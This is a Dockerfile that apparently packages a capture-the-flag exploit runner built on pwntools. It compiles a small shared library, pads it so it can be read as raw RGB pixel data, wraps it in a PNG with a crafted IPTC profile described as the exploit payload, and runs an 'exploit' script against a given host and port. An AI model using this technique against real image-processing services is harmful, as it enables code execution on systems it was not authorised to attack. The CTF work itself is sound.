# - Ubuntu 22.04.4 LTS
# - pwntools v4.12.0 stable
# - Python 3.10.12
# - GLIBC 2.35-0ubuntu3.6
FROM docker.io/pwntools/pwntools@sha256:2df32ff2a7196a6f6d362b037713ec9825266667774df31540bbb9d04f7662ee

# Install apt dependencies if needed
# RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y ... && apt-get clean

ARG TICKET_NAME=foobar

WORKDIR /app
COPY requirements.txt .

# Install pip dependencies
USER root
RUN chmod 777 /app
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y imagemagick exiftool xxd && apt-get clean
RUN python3 -m pip install --no-cache-dir --upgrade -r /app/requirements.txt

# Oh, Ubuntu, never fails to dissapoint
# This time, ImageMagick 6.9.11-60 from January 2021 is screwing up
# the WebP RIFF container.
# There is more data *in the file* than specified in the RIFF header.
# For some reason, there is another RIFF header at the end.
# At least the bugs are super stable and it's not snap-ridden.
#
# However, that means we have to pre-create a tiny WebP animation
# as piggyback.
# Command would have been:
#   convert -delay 100 -size 1x1 xc:Red -page 1x1 xc:Green -loop 0 mini.webp
USER pwntools
COPY mini.webp /app/mini.webp
COPY lib.c /app/lib.c
COPY create_iptc.py /app/create_iptc.py
# Build shared object and ensure it is small enough
RUN cd /app && xxd -i mini.webp > miniwebp.h && gcc -nostdlib -shared -fPIC -Wall -Wextra lib.c -o lib.so && test $(stat -c '%s' lib.so) -lt $((256*256*3))
# Resize shared object to be large enough to be interpreted as 8-bit 256x256 RGB image, bundle it in a PNG and add the exploit payload
RUN /app/create_iptc.py /app/exploit.iptc ${TICKET_NAME}
RUN cd /app && fallocate -l $((256*256*3)) lib.so && convert -depth 8 -size 256x256 RGB:lib.so -profile exploit.iptc exploit.png


# Copy needed files to /app
COPY exploit .
USER root
RUN chmod 755 /app/exploit
USER pwntools

ENV PWNLIB_NOTERM=1

CMD /usr/bin/timeout -k 5 ${TIMEOUT} ./exploit HOST=${HOST} PORT=${PORT} TICKET_NAME=${TICKET_NAME}
